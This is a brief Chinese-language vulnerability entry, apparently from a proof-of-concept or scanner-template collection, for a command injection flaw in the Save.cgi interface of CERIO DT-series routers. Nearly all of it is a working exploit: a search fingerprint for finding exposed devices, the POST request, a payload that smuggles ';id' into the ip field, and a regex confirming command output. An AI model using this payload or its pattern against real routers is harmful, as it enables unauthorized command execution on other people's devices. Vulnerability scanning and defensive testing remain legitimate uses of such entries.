# CERIO-DT系列路由器Save.cgi接口存在命令执行漏洞

CERIO ｜ 命令执行 ｜ —
- **指纹**：`title="DT-100G-N"`
- **请求**：`POST /cgi-bin/Save.cgi?cgi=PING HTTP/1.1`

**Payload**
```
pid=2061&ip=127.0.0.1;id&times=1
```
- **响应特征**：200 ^(?=.*?uid)(?=.*?gid).*?$